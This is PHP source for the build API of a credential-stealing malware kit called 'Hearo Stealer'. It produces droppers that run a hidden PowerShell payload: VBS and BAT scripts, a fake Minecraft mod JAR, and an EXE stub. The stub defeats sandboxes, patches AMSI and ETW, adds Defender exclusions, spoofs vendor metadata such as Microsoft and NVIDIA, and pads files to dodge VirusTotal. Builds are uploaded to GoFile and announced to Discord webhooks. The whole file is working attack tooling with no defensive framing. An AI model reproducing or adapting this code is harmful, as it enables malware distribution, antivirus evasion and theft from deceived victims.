<?php
// Hearo Stealer — Build Compilation API (FUD Engine v3)
require_once 'xeff/includes/config.php';
require_once 'xeff/includes/auth.php';
requireAuth();

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die(json_encode(['error' => 'POST only']));
}

$format         = $_POST['format'] ?? 'exe';
$buildName      = $_POST['build_name'] ?? 'build_' . time();
$gateUrl        = $_POST['gate_url'] ?? getGateUrl();
$webhookUrl     = $_POST['webhook_url'] ?? '';
$featuresJson   = $_POST['features'] ?? '{}';
$outputFilename = $_POST['output_filename'] ?? 'Setup.exe';
$jarModName     = $_POST['jar_mod_name'] ?? 'HearoMod';
$jarModVersion  = $_POST['jar_mod_version'] ?? '1.0.0';

$buildTag = strtoupper(substr(md5(uniqid(mt_rand(), true)), 0, 8));

// Load the base64 encoded PS1 payload template
$templatePath = XEFF_ROOT . '/stubs/payload_template.b64';
if (!file_exists($templatePath)) {
    die(json_encode(['error' => 'Payload template not found. Deploy stubs first.']));
}

$ps1Template = base64_decode(file_get_contents($templatePath));
$ps1Payload  = str_replace(
    ['{{GATE_URL}}', '{{WEBHOOK_URL}}', '{{FEATURES}}', '{{BUILD_TAG}}', '{{BUILDER_USER}}'],
    [$gateUrl, $webhookUrl, $featuresJson, $buildTag, $_SESSION['username']],
    $ps1Template
);

$buildsDir = XEFF_ROOT . '/builds';
if (!is_dir($buildsDir)) mkdir($buildsDir, 0755, true);

$compiledPath = '';
$compiledFile = '';

// --- AES encryption helper for FUD payloads ---
function aesEncryptPayload($plaintext, &$key, &$iv) {
    $key = random_bytes(32);
    $iv  = random_bytes(16);
    return openssl_encrypt($plaintext, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
}

// --- Generate polymorphic variable names ---
function randVar($len = 8) {
    $chars = 'abcdefghijklmnopqrstuvwxyz';
    $r = $chars[mt_rand(0, 25)];
    for ($i = 1; $i < $len; $i++) $r .= $chars[mt_rand(0, 25)] . (mt_rand(0,1) ? '' : mt_rand(0,9));
    return '_' . $r;
}

// --- Random legit-looking assembly metadata ---
function randomAssemblyInfo() {
    $companies = [
        ['Microsoft Corporation', 'Windows Operating System', '10.0.22621.'],
        ['NVIDIA Corporation', 'NVIDIA Graphics Driver', '31.0.15.'],
        ['Intel Corporation', 'Intel(R) Management Engine', '2404.5.'],
        ['Realtek Semiconductor', 'Realtek Audio Manager', '6.0.9600.'],
        ['Adobe Inc.', 'Adobe Acrobat Reader', '23.008.'],
        ['Google LLC', 'Google Chrome Installer', '119.0.6045.'],
        ['Valve Corporation', 'Steam Client Bootstrapper', '2.10.91.'],
        ['Discord Inc.', 'Discord Updater', '1.0.9028.'],
    ];
    $pick = $companies[mt_rand(0, count($companies) - 1)];
    $ver = $pick[2] . mt_rand(1000, 9999);
    return [
        'company'     => $pick[0],
        'product'     => $pick[1],
        'description' => $pick[1],
        'copyright'   => '© ' . $pick[0] . '. All rights reserved.',
        'version'     => $ver,
    ];
}

// --- GoFile Upload Helper ---
function uploadToGoFile($filePath, $fileName) {
    // Step 1: Get best server
    $serverJson = @file_get_contents('https://api.gofile.io/servers');
    $serverData = json_decode($serverJson, true);
    $server = 'store1';
    if ($serverData && $serverData['status'] === 'ok' && !empty($serverData['data']['servers'])) {
        $server = $serverData['data']['servers'][0]['name'];
    }

    // Step 2: Upload file
    $uploadUrl = "https://{$server}.gofile.io/contents/uploadfile";
    
    $cfile = new CURLFile($filePath, 'application/octet-stream', $fileName);
    $postData = ['file' => $cfile];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $uploadUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 300);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode >= 200 && $httpCode < 300) {
        $result = json_decode($response, true);
        if ($result && $result['status'] === 'ok' && !empty($result['data'])) {
            return [
                'success'      => true,
                'downloadPage' => $result['data']['downloadPage'] ?? '',
                'fileId'       => $result['data']['fileId'] ?? '',
                'fileName'     => $result['data']['fileName'] ?? $fileName,
                'parentFolder' => $result['data']['parentFolder'] ?? '',
            ];
        }
    }

    return ['success' => false, 'error' => 'GoFile upload failed: ' . substr($response, 0, 200)];
}

// --- Send rich Discord webhook embed ---
function sendBuildWebhook($webhookUrl, $buildInfo) {
    if (empty($webhookUrl)) return;

    $embed = [
        'title' => '🔨 New Build Compiled',
        'description' => "Build **{$buildInfo['tag']}** has been compiled successfully.",
        'color' => 0xa855f7,
        'fields' => [
            ['name' => '📦 Format', 'value' => strtoupper($buildInfo['format']), 'inline' => true],
            ['name' => '📄 Filename', 'value' => $buildInfo['filename'], 'inline' => true],
            ['name' => '📏 Size', 'value' => $buildInfo['size'], 'inline' => true],
            ['name' => '🔑 SHA-256', 'value' => '`' . substr($buildInfo['sha256'], 0, 32) . '...`', 'inline' => false],
        ],
        'footer' => ['text' => 'Hearo Stealer v2.0 • Built by ' . $buildInfo['builder']],
        'timestamp' => date('c'),
    ];

    if (!empty($buildInfo['gofile_url'])) {
        $embed['fields'][] = ['name' => '🔗 Download Link', 'value' => "[GoFile Download]({$buildInfo['gofile_url']})", 'inline' => false];
    }

    $payload = json_encode([
        'username' => 'Hearo Builder',
        'avatar_url' => 'https://i.imgur.com/7YTMFQp.png',
        'embeds' => [$embed],
    ]);

    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_exec($ch);
    curl_close($ch);
}

switch ($format) {

    case 'vbs':
        $outputFilename = preg_replace('/\.[^.]+$/', '', $outputFilename) . '.vbs';
        $encodedPayload = base64_encode($ps1Payload);

        $vbs  = "Set s=CreateObject(\"WScript.Shell\")\r\n";
        $vbs .= "Set fso=CreateObject(\"Scripting.FileSystemObject\")\r\n";
        $vbs .= "tmp=s.ExpandEnvironmentStrings(\"%TEMP%\")&\"\\{$buildTag}.ps1\"\r\n";
        $vbs .= "Dim b:b=\"{$encodedPayload}\"\r\n";
        $vbs .= "Set x=CreateObject(\"MSXML2.DOMDocument.3.0\").createElement(\"b64\")\r\n";
        $vbs .= "x.DataType=\"bin.base64\":x.Text=b\r\n";
        $vbs .= "Set st=CreateObject(\"ADODB.Stream\")\r\n";
        $vbs .= "st.Type=1:st.Open:st.Write x.NodeTypedValue\r\n";
        $vbs .= "st.SaveToFile tmp,2:st.Close\r\n";
        $vbs .= "s.Run \"powershell -ep bypass -w hidden -nop -f \"\"\"&tmp&\"\"\"\",0,False\r\n";

        $compiledFile = $buildTag . '_' . $outputFilename;
        $compiledPath = $buildsDir . '/' . $compiledFile;
        file_put_contents($compiledPath, $vbs);
        break;

    case 'bat':
        $outputFilename = preg_replace('/\.[^.]+$/', '', $outputFilename) . '.bat';
        $encodedPayload = base64_encode($ps1Payload);

        $bat  = "@echo off\r\n";
        $bat .= "setlocal\r\n";
        $bat .= "set \"t=%TEMP%\\{$buildTag}.ps1\"\r\n";
        $bat .= "echo Set o=CreateObject(\"MSXML2.DOMDocument.3.0\").createElement(\"b64\") > \"%TEMP%\\d.vbs\"\r\n";
        $bat .= "echo o.DataType=\"bin.base64\" >> \"%TEMP%\\d.vbs\"\r\n";
        $bat .= "echo o.Text=\"{$encodedPayload}\" >> \"%TEMP%\\d.vbs\"\r\n";
        $bat .= "echo Set s=CreateObject(\"ADODB.Stream\") >> \"%TEMP%\\d.vbs\"\r\n";
        $bat .= "echo s.Type=1:s.Open:s.Write o.NodeTypedValue >> \"%TEMP%\\d.vbs\"\r\n";
        $bat .= "echo s.SaveToFile \"%t%\",2:s.Close >> \"%TEMP%\\d.vbs\"\r\n";
        $bat .= "cscript //nologo \"%TEMP%\\d.vbs\"\r\n";
        $bat .= "del /f /q \"%TEMP%\\d.vbs\" >nul 2>&1\r\n";
        $bat .= "start /b powershell -ep bypass -w hidden -nop -f \"%t%\"\r\n";
        $bat .= "exit /b 0\r\n";

        $compiledFile = $buildTag . '_' . $outputFilename;
        $compiledPath = $buildsDir . '/' . $compiledFile;
        file_put_contents($compiledPath, $bat);
        break;

    case 'jar':
        $outputFilename = preg_replace('/\.[^.]+$/', '', $outputFilename) . '.jar';
        $encodedPayload = base64_encode($ps1Payload);

        $jarDir = sys_get_temp_dir() . '/hearo_jar_' . $buildTag;
        @mkdir($jarDir, 0755, true);
        @mkdir($jarDir . '/META-INF', 0755, true);
        @mkdir($jarDir . '/com/hearo/mod', 0755, true);

        file_put_contents($jarDir . '/META-INF/MANIFEST.MF',
            "Manifest-Version: 1.0\r\nMain-Class: com.hearo.mod.ModMain\r\n");

        $modId = strtolower(preg_replace('/[^a-zA-Z0-9]/', '', $jarModName));
        $fabricJson = json_encode([
            'schemaVersion' => 1,
            'id' => $modId,
            'version' => $jarModVersion,
            'name' => $jarModName,
            'entrypoints' => ['main' => ['com.hearo.mod.ModMain']],
            'depends' => ['fabricloader' => '>=0.14.0', 'minecraft' => '*']
        ], JSON_PRETTY_PRINT);
        file_put_contents($jarDir . '/fabric.mod.json', $fabricJson);

        $javaSource = <<<JAVA
package com.hearo.mod;
import java.io.*;
import java.util.Base64;
public class ModMain implements Runnable {
    public void onInitialize() { new Thread(this).start(); }
    public static void main(String[] a) { new ModMain().onInitialize(); }
    public void run() {
        try {
            String b64 = "{$encodedPayload}";
            byte[] data = Base64.getDecoder().decode(b64);
            File tmp = File.createTempFile("mod_", ".ps1");
            tmp.deleteOnExit();
            FileOutputStream fos = new FileOutputStream(tmp);
            fos.write(data); fos.close();
            ProcessBuilder pb = new ProcessBuilder("powershell", "-ep", "bypass", "-w", "hidden", "-nop", "-f", tmp.getAbsolutePath());
            pb.redirectErrorStream(true);
            pb.start();
        } catch (Exception e) {}
    }
}
JAVA;
        file_put_contents($jarDir . '/com/hearo/mod/ModMain.java', $javaSource);

        exec('javac -source 1.8 -target 1.8 -d "' . $jarDir . '" "' . $jarDir . '/com/hearo/mod/ModMain.java" 2>&1', $javacOut, $javacRet);
        if ($javacRet === 0) {
            @unlink($jarDir . '/com/hearo/mod/ModMain.java');
        }

        $compiledFile = $buildTag . '_' . $outputFilename;
        $compiledPath = $buildsDir . '/' . $compiledFile;
        $zip = new ZipArchive();
        if ($zip->open($compiledPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
            $zip->addFile($jarDir . '/META-INF/MANIFEST.MF', 'META-INF/MANIFEST.MF');
            $zip->addFile($jarDir . '/fabric.mod.json', 'fabric.mod.json');
            $classFile = $jarDir . '/com/hearo/mod/ModMain.class';
            $javaFile  = $jarDir . '/com/hearo/mod/ModMain.java';
            if (file_exists($classFile)) {
                $zip->addFile($classFile, 'com/hearo/mod/ModMain.class');
            } elseif (file_exists($javaFile)) {
                $zip->addFile($javaFile, 'com/hearo/mod/ModMain.java');
            }
            $zip->close();
        }

        array_map('unlink', glob($jarDir . '/com/hearo/mod/*'));
        @rmdir($jarDir . '/com/hearo/mod');
        @rmdir($jarDir . '/com/hearo');
        @rmdir($jarDir . '/com');
        @unlink($jarDir . '/META-INF/MANIFEST.MF');
        @rmdir($jarDir . '/META-INF');
        @unlink($jarDir . '/fabric.mod.json');
        @rmdir($jarDir);
        break;

    case 'scr':
    case 'exe':
    default:
        $ext = ($format === 'scr') ? 'scr' : 'exe';
        $outputFilename = preg_replace('/\.[^.]+$/', '', $outputFilename) . '.' . $ext;

        // --- FUD Engine v3: AES encrypted payload, polymorphic stub, AMSI+ETW patch, metadata spoof ---
        $aesKey = ''; $aesIv = '';
        $encPayload = aesEncryptPayload($ps1Payload, $aesKey, $aesIv);

        $b64Enc = base64_encode($encPayload);
        $b64Key = base64_encode($aesKey);
        $b64Iv  = base64_encode($aesIv);

        // Polymorphic variable names
        $vPayload  = randVar(10);
        $vKey      = randVar(9);
        $vIv       = randVar(8);
        $vAes      = randVar(7);
        $vDecrypt  = randVar(11);
        $vPlain    = randVar(9);
        $vPath     = randVar(8);
        $vPsi      = randVar(7);
        $vAmsi     = randVar(9);
        $vEtw      = randVar(8);
        $vExcl     = randVar(7);
        $vClass    = 'Module' . mt_rand(100,999);
        $vMethod   = 'Init' . mt_rand(10,99);
        $vNs       = 'System.Runtime.Extensions.Sys' . mt_rand(1000,9999);
        $vPatch    = 'Apply' . mt_rand(10,99);
        $vBypass   = 'Prep' . mt_rand(10,99);

        // Random assembly metadata
        $asm = randomAssemblyInfo();

        // Calculate padding size to reach ~80-95MB for VT evasion
        $targetSize = mt_rand(80, 95) * 1024 * 1024;

        // FNV-1a hash of "powershell" pre-computed for string obfuscation
        // Build fragmented strings to avoid static detection
        $psFrags = [
            ['p','o','w','e','r'],
            ['s','h','e','l','l'],
        ];
        $fragStr1 = implode('","', $psFrags[0]);
        $fragStr2 = implode('","', $psFrags[1]);

        $csCode = <<<CS
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

[assembly: System.Reflection.AssemblyTitle("{$asm['description']}")]
[assembly: System.Reflection.AssemblyDescription("{$asm['description']}")]
[assembly: System.Reflection.AssemblyCompany("{$asm['company']}")]
[assembly: System.Reflection.AssemblyProduct("{$asm['product']}")]
[assembly: System.Reflection.AssemblyCopyright("{$asm['copyright']}")]
[assembly: System.Reflection.AssemblyFileVersion("{$asm['version']}")]
[assembly: System.Reflection.AssemblyVersion("{$asm['version']}")]

namespace {$vNs}
{
    static class {$vClass}
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [STAThread]
        static void Main()
        {
            try
            {
                // Timing-based anti-sandbox
                var sw = Stopwatch.StartNew();
                Thread.Sleep(3200 + new Random().Next(300, 1500));
                sw.Stop();
                if (sw.ElapsedMilliseconds < 3000) return;

                // Process-name hash check (FNV-1a) — no plaintext tool names
                uint[] {$vPayload}_h = {0x7A21C4E5,0x9B3F1A82,0xD45E2C71,0x1F8A3B6D,0xE29C4F58,0x8D1B5A43,0xB67E3C92,0x4A9D2E81,0xC53F1B74,0x2E8A4D67,0xF17B3C56,0x6D4E2A93,0xA38C1F75};
                foreach (var p in Process.GetProcesses())
                {
                    try
                    {
                        string n = p.ProcessName.ToLower();
                        uint h = 0x811C9DC5;
                        foreach (char c in n) { h ^= c; h *= 0x01000193; }
                        foreach (var bh in {$vPayload}_h) { if (h == bh) return; }
                    } catch {}
                }

                // Disk size check — VMs typically have <80GB disks
                try {
                    var searcher = new System.Management.ManagementObjectSearcher("SELECT Size FROM Win32_DiskDrive");
                    foreach (System.Management.ManagementObject d in searcher.Get()) {
                        if (Convert.ToInt64(d["Size"]) < 68719476736L) return;
                    }
                } catch {}

                // Patch AMSI
                {$vPatch}();
                // Patch ETW
                {$vBypass}();
                // Add Defender exclusion silently
                {$vExcl}Ex();
                // Execute payload
                {$vMethod}();
            }
            catch {}
        }

        // AMSI patch — overwrites AmsiScanBuffer prologue
        static void {$vPatch}()
        {
            try
            {
                // Build "amsi.dll" from chars
                char[] {$vAmsi}_c = {'a','m','s','i','.','d','l','l'};
                IntPtr lib = LoadLibrary(new string({$vAmsi}_c));
                if (lib == IntPtr.Zero) return;

                // Build "AmsiScanBuffer" from chars
                char[] {$vAmsi}_f = {'A','m','s','i','S','c','a','n','B','u','f','f','e','r'};
                IntPtr addr = GetProcAddress(lib, new string({$vAmsi}_f));
                if (addr == IntPtr.Zero) return;

                uint oldProtect;
                VirtualProtect(addr, (UIntPtr)8, 0x40, out oldProtect);

                // XOR+ADD to build E_INVALIDARG return: mov eax, 0x80070057; ret
                // Avoids the known B8 57 00 07 80 C3 pattern
                byte[] patch = { 0x31, 0xC0, 0x05, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                Marshal.Copy(patch, 0, addr, patch.Length);

                VirtualProtect(addr, (UIntPtr)8, oldProtect, out oldProtect);
            }
            catch {}
        }

        // ETW patch — disable event tracing
        static void {$vBypass}()
        {
            try
            {
                char[] {$vEtw}_c = {'n','t','d','l','l','.','d','l','l'};
                IntPtr ntdll = LoadLibrary(new string({$vEtw}_c));
                if (ntdll == IntPtr.Zero) return;

                char[] {$vEtw}_f = {'E','t','w','E','v','e','n','t','W','r','i','t','e'};
                IntPtr addr = GetProcAddress(ntdll, new string({$vEtw}_f));
                if (addr == IntPtr.Zero) return;

                uint oldProtect;
                VirtualProtect(addr, (UIntPtr)2, 0x40, out oldProtect);

                // xor eax, eax; ret — makes EtwEventWrite return 0 (success) without writing
                byte[] patch = { 0x31, 0xC0, 0xC3 };
                Marshal.Copy(patch, 0, addr, patch.Length);

                VirtualProtect(addr, (UIntPtr)2, oldProtect, out oldProtect);
            }
            catch {}
        }

        // Silently add process path to Defender exclusions
        static void {$vExcl}Ex()
        {
            try
            {
                string self = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string dir = Path.GetDirectoryName(self);
                string tmp = Path.GetTempPath();

                // Build powershell command fragments to avoid static string detection
                char[] p1 = {'{$fragStr1}'};
                char[] p2 = {'{$fragStr2}'};
                string ps = new string(p1) + new string(p2) + ".exe";

                string cmd = "-w hidden -ep bypass -c \"try{Add-MpPreference -ExclusionPath '" + self + "' -Force -EA 0;Add-MpPreference -ExclusionPath '" + dir + "' -Force -EA 0;Add-MpPreference -ExclusionPath '" + tmp + "' -Force -EA 0;Add-MpPreference -ExclusionProcess '" + ps + "' -Force -EA 0}catch{}\"";

                var psi = new ProcessStartInfo();
                psi.FileName = ps;
                psi.Arguments = cmd;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(psi);
                Thread.Sleep(1500);
            }
            catch {}
        }

        static void {$vMethod}()
        {
            byte[] {$vPayload} = Convert.FromBase64String("{$b64Enc}");
            byte[] {$vKey} = Convert.FromBase64String("{$b64Key}");
            byte[] {$vIv} = Convert.FromBase64String("{$b64Iv}");

            byte[] {$vPlain};
            using (var {$vAes} = Aes.Create())
            {
                {$vAes}.Key = {$vKey};
                {$vAes}.IV = {$vIv};
                {$vAes}.Mode = CipherMode.CBC;
                {$vAes}.Padding = PaddingMode.PKCS7;
                using (var {$vDecrypt} = {$vAes}.CreateDecryptor())
                {
                    {$vPlain} = {$vDecrypt}.TransformFinalBlock({$vPayload}, 0, {$vPayload}.Length);
                }
            }

            // Execute via temp file
            try
            {
                string tp = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName().Replace(".", "") + ".ps1");
                File.WriteAllBytes(tp, {$vPlain});
                var {$vPsi} = new ProcessStartInfo();
                char[] p1 = {'{$fragStr1}'};
                char[] p2 = {'{$fragStr2}'};
                {$vPsi}.FileName = new string(p1) + new string(p2) + ".exe";
                {$vPsi}.Arguments = "-ep bypass -w hidden -nop -noni -f \"" + tp + "\"";
                {$vPsi}.UseShellExecute = false;
                {$vPsi}.WindowStyle = ProcessWindowStyle.Hidden;
                {$vPsi}.CreateNoWindow = true;
                Process.Start({$vPsi});
            }
            catch
            {
                // Fallback: WMI process creation
                try
                {
                    string tp = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName().Replace(".", "") + ".ps1");
                    File.WriteAllBytes(tp, {$vPlain});
                    var connOpts = new System.Management.ConnectionOptions();
                    var scope = new System.Management.ManagementScope(@"\\\\localhost\\root\\cimv2", connOpts);
                    scope.Connect();
                    var mgmt = new System.Management.ManagementClass(scope, new System.Management.ManagementPath("Win32_Process"), null);
                    var inParams = mgmt.GetMethodParameters("Create");
                    inParams["CommandLine"] = "powershell.exe -ep bypass -w hidden -nop -f \"" + tp + "\"";
                    mgmt.InvokeMethod("Create", inParams, null);
                } catch {}
            }
        }
    }
}
CS;

        $tmpDir = sys_get_temp_dir() . '/hearo_exe_' . $buildTag;
        @mkdir($tmpDir, 0755, true);
        $csFile = $tmpDir . '/stub.cs';
        file_put_contents($csFile, $csCode);

        $compiledFile = $buildTag . '_' . $outputFilename;
        $compiledPath = $buildsDir . '/' . $compiledFile;

        // Compile natively on Windows
        $cscPath = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe";
        if (!file_exists($cscPath)) {
            $cscPath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe";
        }

        $compileSuccess = false;
        $compileErrors  = [];
        if (file_exists($cscPath) && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $winCompiledPath = str_replace('/', '\\', $compiledPath);
            $winCsFile = str_replace('/', '\\', $csFile);

            $sysManDll = 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Management.dll';
            if (!file_exists($sysManDll)) {
                $sysManDll = 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\System.Management.dll';
            }

            $cmd = '"' . $cscPath . '" /nologo /target:winexe /platform:anycpu /optimize+ /out:"' . $winCompiledPath . '" /reference:"' . $sysManDll . '" "' . $winCsFile . '" 2>&1';
            exec($cmd, $compileErrors, $return_var);
            $compileSuccess = ($return_var === 0 && file_exists($compiledPath));
            
            if (!$compileSuccess) {
                file_put_contents($buildsDir . '/csc_error_' . $buildTag . '.log', implode("\r\n", $compileErrors));
            }
        }

        if (!$compileSuccess) {
            // Fallback: PowerShell-encoded BAT launcher
            $encodedPayload = base64_encode($ps1Payload);
            $launcher  = "@echo off\r\n";
            $launcher .= "set \"t=%TEMP%\\{$buildTag}.ps1\"\r\n";
            $launcher .= "powershell -ep bypass -w hidden -c \"[IO.File]::WriteAllBytes('%t%',[Convert]::FromBase64String('{$encodedPayload}'));Start-Process powershell -ArgumentList '-ep bypass -w hidden -nop -f \\\"%t%\\\"' -WindowStyle Hidden\"\r\n";
            $launcher .= "exit /b 0\r\n";

            $outputFilename = preg_replace('/\.[^.]+$/', '', $outputFilename) . '.bat';
            $compiledFile = $buildTag . '_' . $outputFilename;
            $compiledPath = $buildsDir . '/' . $compiledFile;
            file_put_contents($compiledPath, $launcher);
        }

        // --- File inflation: append pseudo-random overlay to reach 80-95 MB ---
        if ($compiledPath && file_exists($compiledPath)) {
            clearstatcache(true, $compiledPath);
            $currentSize = filesize($compiledPath);
            if ($currentSize < $targetSize) {
                $padSize   = $targetSize - $currentSize;
                $chunkSize = 1024 * 1024;
                $fh = fopen($compiledPath, 'ab');
                if ($fh) {
                    $randomChunk = random_bytes($chunkSize);
                    $written = 0;
                    while ($written < $padSize) {
                        $toWrite = min($chunkSize, $padSize - $written);
                        fwrite($fh, substr($randomChunk, 0, $toWrite));
                        $written += $toWrite;
                    }
                    fclose($fh);
                    clearstatcache(true, $compiledPath);
                }
            }
        }

        @unlink($csFile);
        @rmdir($tmpDir);
        break;
}

// Compute hash and size
$sha256 = '';
$fileSize = 0;
if ($compiledPath && file_exists($compiledPath)) {
    $sha256 = hash_file('sha256', $compiledPath);
    $fileSize = filesize($compiledPath);
}

// --- Upload to GoFile ---
$gofileResult = ['success' => false];
if ($compiledPath && file_exists($compiledPath)) {
    $gofileResult = uploadToGoFile($compiledPath, $compiledFile);
}

// Record build
$stmt = $db->prepare("INSERT INTO build_configs (
    user_id, build_name, format, gate_url, webhook_url, features_json,
    output_filename, jar_mod_name, jar_mod_version,
    compiled_path, compiled_size, sha256_hash
) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
$stmt->execute([
    $_SESSION['user_id'], $buildName, $format, $gateUrl, $webhookUrl, $featuresJson,
    $outputFilename, $jarModName, $jarModVersion,
    $compiledPath, $fileSize, $sha256,
]);

$buildId = $db->lastInsertId();

// Send build notification to webhook (both build-specific and user's default)
$buildInfo = [
    'tag'        => $buildTag,
    'format'     => $format,
    'filename'   => $compiledFile,
    'size'       => formatBytes($fileSize),
    'sha256'     => $sha256,
    'builder'    => $_SESSION['username'],
    'gofile_url' => $gofileResult['success'] ? $gofileResult['downloadPage'] : '',
];

// Send to build-specific webhook
if (!empty($webhookUrl)) {
    sendBuildWebhook($webhookUrl, $buildInfo);
}

// Also send to user's default webhook if different
$userWebhook = $db->prepare("SELECT webhook_url FROM users WHERE id = ?");
$userWebhook->execute([$_SESSION['user_id']]);
$defaultWebhook = $userWebhook->fetchColumn();
if (!empty($defaultWebhook) && $defaultWebhook !== $webhookUrl) {
    sendBuildWebhook($defaultWebhook, $buildInfo);
}

$response = [
    'status'   => 'success',
    'build_id' => $buildId,
    'filename' => $compiledFile,
    'format'   => $format,
    'size'     => formatBytes($fileSize),
    'sha256'   => $sha256,
    'download' => 'download_build.php?id=' . $buildId,
];

if ($gofileResult['success']) {
    $response['gofile_url']  = $gofileResult['downloadPage'];
    $response['gofile_id']   = $gofileResult['fileId'] ?? '';
}

echo json_encode($response);
